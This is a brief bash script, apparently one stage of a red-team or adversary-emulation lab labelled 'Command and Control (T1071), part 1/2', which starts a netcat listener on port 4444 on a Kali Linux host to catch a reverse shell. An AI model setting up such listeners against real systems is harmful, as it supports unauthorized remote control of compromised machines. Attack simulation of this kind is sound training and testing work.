#!/usr/bin/env bash
# Stage 8 — Command and Control (T1071), part 1/2
# Host: Kali Linux — listener
set -euo pipefail

nc -lvnp 4444
